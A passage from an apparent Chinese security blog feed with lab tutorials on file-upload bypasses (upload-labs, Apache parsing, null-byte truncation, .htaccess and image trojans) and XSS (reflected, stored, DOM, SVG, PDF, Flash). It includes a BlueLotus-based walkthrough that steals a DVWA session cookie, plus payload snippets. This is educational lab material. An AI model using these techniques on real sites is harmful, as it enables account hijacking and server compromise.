src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720628644561-242a0837-609d-4595-8a74-6db3e3b47048.png"></p><blockquote><p>在Apache版本符合的条件下，对mime.types中没有涉及的文件后缀不会解析，查看httpd.conf文件下的mime.types，没有发现7z后缀，说明不会解析7z文件</p></blockquote><blockquote><p>Apache解析漏洞：Apache解析是从后往前，当一个后缀不能被解析时，会从后往前一直解析到可以解析的后缀为止，所以如果我们传入test.php.7z文件时，会被当作test.php执行</p></blockquote><p>1.创建1.php.7z文件，文件内容如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>接下来的步骤和条件竞争绕过相同</p></blockquote><p>2.上传1.php.7z文件并爆破</p><p>3.访问1.php.7z文件并爆破</p><p>4.访问shell.php</p><blockquote><p>这里好像路径出了点问题，我最后也没有成功</p></blockquote><p>Pass-20</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720630266760-ca4fc3f3-3c36-4ccd-8af6-2742ad03fcf9.png"></p><p>我们上传php文件，保存为jpg文件</p><blockquote><p>实际上是一个%00截断</p></blockquote><p>1.上传php文件</p><p>2.将保存名称后缀改为php</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720630832074-72eb2a5d-6179-4569-8f9d-b71532b71e4e.png"></p><p>3.使用00截断</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720630816101-4593c6ca-6145-41eb-a6c2-9ffa5b96ab92.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720630844658-3a70bc93-0bae-45f7-9a47-99144f335218.png"></p><p>4.蚁剑连接测试</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720630920190-dc202fb3-8eec-484e-83ed-35803155084d.png"></p><h2 id="数组绕过（Pass-21）"><a href="#数组绕过（Pass-21）" class="headerlink" title="数组绕过（Pass-21）"></a>数组绕过（Pass-21）</h2><blockquote><p>详解可以看这位师傅的<a href="https://www.cnblogs.com/LING5/articles/18064737">https://www.cnblogs.com/LING5/articles/18064737</a></p></blockquote><p>Pass-21</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720631758135-1b72f5c0-645d-4666-ad31-9169449562fc.png"></p><p>上传php文件，抓包，修改请求体信息</p><p>修改前：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720631471058-0b0dba90-00e0-4be9-bae6-ba44c2dba7eb.png"></p><p>修改后：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720631399222-1ff7fee1-04d3-4344-bc8e-8244a185fc5c.png"></p><p>上传成功</p><p>测试，连接成功</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720631444740-b8869bdc-7f10-4e93-8be2-c1bfaf53045e.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件上传的过滤</p><p>前端检测：浏览器禁用js即可绕过</p><p>后端检测：</p><ul><li>MIME类型检测</li></ul><ol><li>修改MIME类型为合法类型即可</li></ol><blockquote><p>常见的MIME类型</p><p>超文本标记语言.html文件：text&#x2F;html</p><p>普通文本.txt文件：text&#x2F;plain</p><p>PDF文档.pdf：application&#x2F;pdf</p><p>PNG图像.png：image&#x2F;png</p><p>GIF图像.gif：image&#x2F;gif</p><p>JPG图像.jpg：image&#x2F;jpg</p><p>MPEG文件.mpg、.mpeg：video&#x2F;mpeg</p></blockquote><ul><li>后缀名检测</li></ul><table><thead><tr><th align="center">黑名单<br/></th><th>使用其他可解析的后缀名<br/>&gt; PHP：php2、php3、php5、phtml、pht<br/>&gt; ASP：asa、cer、cdx<br/>&gt; ASPX：ascx、ashx、asac<br/>&gt; JSP：jspx、jspf<br/></th></tr></thead><tbody><tr><td align="center"></td><td>重写绕过<br/>&gt; 后缀名进行双写，比如phphpp<br/></td></tr><tr><td align="center"></td><td>.htaccess绕过<br/>&gt; 上传.htaccess文件，再上传有木马语句的合法文件<br/></td></tr><tr><td align="center"></td><td>大小写绕过<br/>&gt; 后缀名大小写混用，比如Php（windows对大小写不敏感）<br/></td></tr><tr><td align="center"></td><td>使用windows特性绕过<br/>&gt; 1. .（点）绕过，在文件名后缀加上.（windows会自动过滤文件名后的点）<br/>&gt; 2.  （空格）绕过，在文件名后缀上加上空格（windows会自动过滤文件后缀名末尾的空格）<br/>&gt; 3. . .（点空格点）绕过，混合使用，在文件名后缀加上点空格点<br/>&gt; 4. ::$DATA绕过，在文件名后加上::$DATA，比如shell.php::$DATA<br/></td></tr><tr><td align="center">白名单<br/><br/></td><td>00截断</td></tr><tr><td align="center"></td><td>当通过$_GET方式获取图片路径（路径在url中）<br/>%00截断<br/>&gt; 1. 将上传文件后缀改为合法<br/>&gt; 2. 在url中的文件路径后写一个php文件，后面加上%00<br/></td></tr><tr><td align="center"></td><td>当通过$_POST方式获取图片路径（路径在请求体中）   0x00截断<br/>&gt; 1. 更改上传文件后缀为合法<br/>&gt; 2. 在请求体中的文件路径后写一个php文件，后面加上一个+（加号）<br/>&gt; 3. 进入hex编辑将+改为00<br/></td></tr></tbody></table><ul><li>文件内容检测</li></ul><ol><li>图片马绕过</li></ol><p>将正常图片和php文件组合起来形成图片马再上传</p><blockquote><p>copy 图片&#x2F;b + php文件&#x2F;a 生成的文件</p><p>例如：copy test.png&#x2F;b + shell.php&#x2F;a shell.png</p></blockquote><blockquote><p>要使用文件包含漏洞去解析这个图片马</p></blockquote><ol start="2"><li>二次渲染绕过</li></ol><p>将上传后和上传前的文件进行对比，找到没有被二次渲染改变的部分，插入php代码，再上传</p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2025/05/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2025/05/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>客户端文件上传到服务器的过程</p><p>当上传文件的时候，如果服务器的后端代码没有对上传的文件进行严格的验证和过滤，就容易造成上传任意文件的情况，如果可以上传webshell，就形成了文件上传漏洞</p><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>攻击者通过上传恶意文件传递给解释器去执行，并在服务器上执行恶意代码。比如进行数据库执行、服务器文件管理、命令执行等恶意操作。从而控制整个网站，甚至是服务器</p><h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><ol><li>成功上传文件到服务器</li><li>文件能够被访问到（知道路径）</li><li>文件被解释器解析执行</li></ol><h1 id="文件检测方式"><a href="#文件检测方式" class="headerlink" title="文件检测方式"></a>文件检测方式</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720260195227-2019461e-9e09-4b73-b4ab-5aa21684b7a2.png"></p><h1 id="判断文件检测方式"><a href="#判断文件检测方式" class="headerlink" title="判断文件检测方式"></a>判断文件检测方式</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720260042533-48a155a8-0d26-459c-a673-cc382482d10a.png"></p><h1 id="漏洞防御措施"><a href="#漏洞防御措施" class="headerlink" title="漏洞防御措施"></a>漏洞防御措施</h1><ol><li>上传的目录设置为不可执行</li><li>对文件后缀的判断中使用白名单的方式</li><li>文件服务器和web服务器分离</li><li>不需要返回文件路径的情况下，随即改写文件名</li></ol><h1 id="实际渗透"><a href="#实际渗透" class="headerlink" title="实际渗透"></a>实际渗透</h1><blockquote><p>只要证明服务器可以解析我们所上传的文件内容即可</p></blockquote><p>当我们实际渗透中，不能传危险文件，可以传phpinfo或者是加密字符串，从而看是否存在漏洞</p><p>phpinfo</p><p>文件上传传入phpinfo</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>获取上传路径，访问该文件，发现有回显，存在文件上传</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720264506225-f12f9ed4-ba0b-45f5-9dea-a20fadb620ec.png"></p><blockquote><p>不是一句话木马，是一个函数，返回服务器信息</p></blockquote><p>加密字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo md5(&#x27;1&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>说明对php代码进行了解析，存在文件上传</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720264749908-a56f2e8c-a58f-4ffb-809d-66343bd731bc.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720264773152-8d311146-d7a0-4ff4-b5d5-14cbed888bd2.png"></p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用蓝莲花BlueLotus通过XSS获取Cookie</title>
      <link href="/2025/05/27/%E5%88%A9%E7%94%A8%E8%93%9D%E8%8E%B2%E8%8A%B1BlueLotus%E9%80%9A%E8%BF%87XSS%E8%8E%B7%E5%8F%96Cookie/"/>
      <url>/2025/05/27/%E5%88%A9%E7%94%A8%E8%93%9D%E8%8E%B2%E8%8A%B1BlueLotus%E9%80%9A%E8%BF%87XSS%E8%8E%B7%E5%8F%96Cookie/</url>
      
        <content type="html"><![CDATA[<p>蓝莲花</p><blockquote><p>BlueLotus_XSSReceiver清华大学蓝莲花战队做的一个平台，优点是足够小，不需要数据库，只要有个能运行php的环境就可以了，缺点是一般只适合一个人用。</p></blockquote><h1 id="配置蓝莲花"><a href="#配置蓝莲花" class="headerlink" title="配置蓝莲花"></a>配置蓝莲花</h1><ol><li>拉取docker</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull romeoz/docker-apache-php:5.6</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721744106055-30569b7b-5195-4397-ac02-19ebed891254.png"></p><ol start="2"><li>上传文件</li></ol><p>文件下载地址：<a href="https://github.com/trysec/BlueLotus_XSSReceiver">https://github.com/trysec/BlueLotus_XSSReceiver</a></p><p>解压</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip -d /opt/bluelotus bluelotus.zip  </span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721744325355-10a324a4-029b-416b-8e5b-f2bcfbbae231.png"></p><ol start="3"><li>将文件放入容器中</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9999:80 -v /opt/bluelotus:/var/www/app romeoz/docker-apache-php:5.6  </span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721744558832-8684c596-198d-4e61-87e6-17dca6db5ed7.png"></p><p>返回结果为容器名</p><p>验证是否成功</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721744676996-e6d27d9b-5833-496e-90ff-2eeba5dbafb9.png"></p><blockquote><p>可以看到内容，成功</p></blockquote><ol start="4"><li>修改配置</li></ol><p>切换到bluelotus路径下，分别输入下面三行代码执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv config-sample.php config.php</span><br><span class="line">chmod 777 myjs</span><br><span class="line">chmod 777 data</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721744965771-40b2f207-ecd9-434d-81bc-e1d57c22990d.png"></p><ol start="5"><li>物理机访问</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.130:9999/login.php</span><br></pre></td></tr></table></figure><blockquote><p>这里的ip为蓝莲花所在的ip（kali的ip）</p></blockquote><p>密码为bluelotus</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721745428716-197bff89-9c08-4103-8720-a2b80494552e.png"></p><p>新增js</p><h1 id="使用蓝莲花"><a href="#使用蓝莲花" class="headerlink" title="使用蓝莲花"></a>使用蓝莲花</h1><p>生成payload，将payload插入存在xss的地方</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721745786826-61200fc7-0c3a-4f43-953c-799a462d448d.png"></p><p>插入dvwa靶场的xss存储型处</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721745875318-0e3777a9-205b-4d0e-b33a-d73c39fd359b.png"></p><blockquote><p>这里需要更改一下输入框的限制长度</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721747919590-5f17dc43-d7be-46a7-ba00-3ae2fb8b7d65.png"></p></blockquote><p>受害者浏览被插入代码的网页，浏览器就会将受害者的cookie发送给攻击者的蓝莲花平台</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721746012431-e47d38ff-fee1-466d-8208-5e5cff8e6852.png"></p><p>复制之后得到cookie</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721746107709-b21b49c7-aeb6-4af2-8c6d-455443c2b068.png"></p><p>PHPSESSID%253Dd4nmvlu0tp5g5q5t9l24f7ni4p</p><blockquote><p>内容需要进行两次URL解码</p></blockquote><p>PHPSESSID&#x3D;d4nmvlu0tp5g5q5t9l24f7ni4p</p><blockquote><p>反射型需要将url发送给受害者即可 </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2025/05/27/XSS/"/>
      <url>/2025/05/27/XSS/</url>
      
        <content type="html"><![CDATA[<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>跨站脚本攻击（一种客户端代码注入攻击）</p><blockquote><p>攻击者往web页面中插入恶意代码，当受害者的浏览器加载网站时代码会执行</p></blockquote><h1 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h1><p>服务器对<strong>输入和输出</strong>没有做严格限制，导致攻击者构造的字符输出到前端时被浏览器执行当作有效代码解析执行从而产生了危害</p><blockquote><p>输入可控，尝试把控制数据改为js代码，让浏览器解析执行</p></blockquote><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>JavaScript能做的事情就能通过XSS做</p><ol><li>钓鱼欺骗</li><li>网站挂马</li><li>身份盗用</li><li>盗取网站用户信息</li><li>垃圾信息发送</li><li>劫持用户web行为</li><li>xss蠕虫</li></ol><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><ol><li>反射性</li></ol><p>非持久型，攻击相对于受害者来说是一次性的，具体表现在受害者点击了含有恶意JS脚本的url，恶意代码并没有保存在目标网站，而web应用程序只是不加处理的把恶意脚本反射给受害者浏览器，导致受害者浏览器执行了相应的脚本</p><ol start="2"><li>存储型</li></ol><p>应用程序通过web请求获取不可信赖的数据，在未检验数据是否符合xss代码的情况下，便将其存入数据库，下一次从数据库获取该数据时也未对其进行过滤，页面再次执行xss代码持续攻击用户。</p><blockquote><p>存储型XSS漏洞大多出现在评论区、留言板，用户提交了包含XSS代码的留言到数据库，当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来</p></blockquote><ol start="3"><li>DOM型</li></ol><p>不与后台服务器交互数据，也属于反射性的一种，通过dom操作前端输出的时候产生问题。</p><blockquote><p>DOM（Document Object Model），是一个平台和语言都中立的接口，可以是程序和脚本能够动态访问和更新文档内容、结构以及样式。</p></blockquote><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>测试流程：看输出想输入在哪里，更改输入代码看执行（标签，过滤决定）</p><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>代码在url中</p><p>文件内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt; </span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;input&quot;</span>&gt;     </span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$XssReflex</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;output:&lt;br&gt;&#x27;</span>.<span class="variable">$XssReflex</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>浏览器访问，当用户输入什么，页面返回什么，没有对用户输入进行过滤</p><p>可以传入html代码，XSS代码-&gt;html代码（可以传入html标签）</p><p>传入<h1>1</h1></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721734047732-9c6710c0-b6f2-474a-9055-d4fa959f8749.png"></p><p>我们插入的XSS代码，可以让他出一个弹窗，可以执行JavaScript代码</p><script>alert(1)</script><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721734253461-f06b8340-d1d5-4355-b64a-347fa14c4609.png"></p><img src=1 onerror=alert(1)><img src=1 onclick=alert(1)><p>dvwa靶场演示：</p><p>我们在两个浏览器分别登录dvwa的两个不同用户</p><p>攻击者构造payload，将url发送给受害者</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721735136660-7755237b-8405-4e90-8604-e3dec7900ede.png"></p><p>受害者点击url后JavaScript代码执行</p><blockquote><p>触发前提：受害者登录网站，点击恶意链接</p></blockquote><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>dvwa靶场演示：</p><p>攻击者在留言板中插入xss代码，存储到数据库中</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721735661557-b3c08d34-969a-4b5d-b1cb-fc0adf0c6b84.png"></p><p>受害者每次访问都会出现弹窗</p><p>只有从数据库把插入的xss代码删除才会停止</p><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>DOM（Document Object Model）文档对象模型，是HTML和XML文档的编程接口</p><p>HTML DOM定义了所有HTML元素的对象和属性，以及访问它们的方法</p><blockquote><p>HTML DOM是关于如何获取、修改、添加或删除HTML元素的标准</p></blockquote><p>DOM以树结构表达HTML文档</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721736042657-9f35bfb9-201d-442b-93ae-8a77354b6da4.png"></p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>不会与后台进行交互，是完完全全的web前端安全问题</p><p>客户端的脚本程序可以通过DOM动态地检查和修改页面内容，并不与服务端进行交互，而是从客户端获取DOM中的数据（如URL中数据）并在本地执行；其次，浏览器用户可以操作DOM中的一些对象，如URL、location等，当攻击者可以控制一些DOM对象，输入一些恶意JS代码，而客户端的脚本并没有对用户的输入进行有效的过滤，传入一些危险函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在</p><p><a href="http://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">浅析DOM型XSS [ Mi1k7ea ]</a></p><p>dvwa靶场演示</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721738397605-7a1a0851-3a49-4752-9839-65271e69791b.png"></p><p>更改参数为XSS代码</p><p>?default&#x3D;<script>alert(1)</script></p><h1 id="其他类型XSS"><a href="#其他类型XSS" class="headerlink" title="其他类型XSS"></a>其他类型XSS</h1><h2 id="MXSS"><a href="#MXSS" class="headerlink" title="MXSS"></a>MXSS</h2><p>变异型跨站点脚本，是一种由HTML处理方式引起的安全漏洞。即使 Web 应用程序具有强大的过滤器来阻止传统的 XSS攻击，mXSS仍可能潜入其中。这是因为mXSS利用HTML行为中的特殊性，使数据清洗工具无法发现恶意元素。</p><blockquote><p>现在基本没有</p></blockquote><h2 id="UXSS"><a href="#UXSS" class="headerlink" title="UXSS"></a>UXSS</h2><p><a href="https://juejin.cn/post/7031788659221200927">https://juejin.cn/post/7031788659221200927</a></p><blockquote><p>现在也基本见不到</p></blockquote><p>UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。</p><p>CVE-2021-34506</p><blockquote><p>Edge浏览器翻译功能导致JS语句被调用执行（网站提前插入XSS代码，本身无害化，但是经过该浏览器翻译功能一翻译，就会触发这个XSS代码）</p></blockquote><h2 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG-XSS"></a>SVG-XSS</h2><p>SVG类型文件可以理解为和jpg、png类似的后缀图片格式，打开之后还是一个图片</p><blockquote><p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p></blockquote><p>复现：</p><p>svg图片文件内容：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733129076889-8b09c1e3-4a49-4ff8-83b1-6d0e037318b6.png"></p><p>poc：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;circle cx=&quot;100&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;2&quot; fill=&quot;red&quot; /&gt;</span><br><span class="line">   &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>只需要插入<script>alert(1)</script>即可</p></blockquote><p>将js代码插入svg文件中</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733129275784-e747e1f8-65cc-4bee-8037-940e3ddd1752.png"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt;</span><br><span class="line">&lt;circle cx=&quot;100&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;2&quot; fill=&quot;red&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>上传svg文件，xss代码被执行，形成svg-xss</p><p>访问上传后的svg文件地址，被解析执行</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733130419087-c378c7c0-f2c6-4d21-889c-decf74c6ddb9.png"></p><h2 id="HTML-XSS"><a href="#HTML-XSS" class="headerlink" title="HTML-XSS"></a>HTML-XSS</h2><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryQBqxUDSihkjIckMP</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.html&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.onload = function () &#123;</span><br><span class="line">            alert(&#x27;123&#x27;);</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line">------WebKitFormBoundaryQBqxUDSihkjIckMP--</span><br></pre></td></tr></table></figure><h2 id="PDF-XSS"><a href="#PDF-XSS" class="headerlink" title="PDF-XSS"></a>PDF-XSS</h2><p>复现：</p><p>1、创建PDF，加入动作JS</p><p>2、通过文件上传获取直链</p><p>3、直链地址访问后被触发</p><p>创建空白pdf</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733129908885-ff14de39-ab21-497f-8cd3-c326767f354b.png"></p><p>向空白pdf中插入js</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733129879324-fc7f1dbc-5ad8-4982-a32b-ba7f52553c01.png"></p><p>app表示打开pdf的当前应用</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733130057228-c2ec2765-980f-4182-8502-a0a72f2abd2c.png"></p><p>浏览器打开该pdf，xss代码执行</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733130138813-a1d3c6d6-ea06-487f-882f-e265f40c15a5.png"></p><p>在有文件上传的点时，上传该pdf，获取上传文件路径，访问即可触发xss</p><p>还可以使用python生成含有xss的pdf</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PyPDF2 <span class="keyword">import</span> PdfReader, PdfWriter</span><br><span class="line"><span class="comment"># 创建一个新的 PDF 文档</span></span><br><span class="line">output_pdf = PdfWriter()</span><br><span class="line"><span class="comment"># 添加一个新页面</span></span><br><span class="line">page = output_pdf.add_blank_page(width=<span class="number">72</span>, height=<span class="number">72</span>)</span><br><span class="line"><span class="comment"># 添加js代码</span></span><br><span class="line">output_pdf.add_js(<span class="string">&quot;app.alert(&#x27;123&#x27;);&quot;</span>)</span><br><span class="line"><span class="comment"># 将新页面写入到新 PDF 文档中</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;xss.pdf&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    output_pdf.write(f)</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733130639157-c7f5eef9-9952-4fbd-a97d-e03fc3410435.png"></p><h2 id="Flash-XSS（SWF-XSS）"><a href="#Flash-XSS（SWF-XSS）" class="headerlink" title="Flash-XSS（SWF-XSS）"></a>Flash-XSS（SWF-XSS）</h2><p>1、反编译swf文件</p><p>2、查找触发危险函数</p><p>3、找可控参数访问触发</p><p>xss一是指执行恶意js，那么为什么说flash xss呢？是因为flash有可以调用js的函数，也就是可以和js通信，因此这些函数如果使用不当就会造成xss。</p><p>常见的可触发xss的危险函数有：getURL，navigateToURL，ExternalInterface.call(最多)，htmlText，loadMovie等等</p><p>复现：</p><p>新建swf文件</p><p>随便选一个动画模板</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733131882320-ccc0a813-5152-4b14-b111-0abb858a4d7d.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733131952906-6da63f57-729b-473e-8260-41517faa482b.png"></p><p>F9进入代码区域，写入攻击payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//取m参数</span><br><span class="line">var m=_root.m;</span><br><span class="line">//调用html中Javascript中的m参数值</span><br><span class="line">flash.external.ExternalInterface.call(m);</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132057944-58f775bb-216c-41d1-a82b-bdb447894ce4.png"></p><p>ctrl+回车看看能否正常显示</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132081301-1b634733-8971-4719-8010-66495aab9393.png"></p><p>设置好后点击发布设置，发布即可</p><p>实战中将我们制作好的swf文件上传，访问swf文件，给m参数传参js代码，使js代码执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?m=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132439839-232b9d70-7c16-46cf-9c62-678886dd7923.png"></p><p>如果没有文件上传点，可以先进行目录扫描，如果存在swf文件，对swf文件下载，使用JPEXS进行逆向分析</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132563701-e3c1fb9c-b7c8-43bd-a050-885333e9f878.png"></p><p>找ExternalInterface.call函数</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132619188-b390c1a4-50c2-4a23-b7ed-6675ea2847c6.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1733132661474-5434d771-c1a1-4fe3-a3de-28ab33133383.png"></p><p>这里就是jsobject这个变量，我们对这个变量传参</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132704104-3f8c6926-034c-49d7-bca7-c40ad88224eb.png"></p><p>如果这里不是获取变量的值，而是写死了，用户不可控，就无法利用</p><p><img 